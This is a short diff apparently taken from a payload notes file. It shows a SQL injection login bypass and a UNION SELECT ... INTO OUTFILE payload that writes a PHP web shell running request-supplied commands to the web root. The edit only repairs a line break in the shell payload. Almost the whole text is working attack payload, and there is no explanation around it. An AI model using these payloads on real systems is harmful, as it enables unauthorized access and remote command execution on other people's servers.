@@ -5,6 +5,5 @@
 admin' or 1=1;#
 ```
 ```php
-a' union select "","<?php @system($_REQUEST['cmd']); ?
->","","" into OUTFILE '/var/www/html/shell.php';#
+a' union select "","<?php @system($_REQUEST['cmd']);?>","","" into OUTFILE '/var/www/html/shell.php';#
 ```
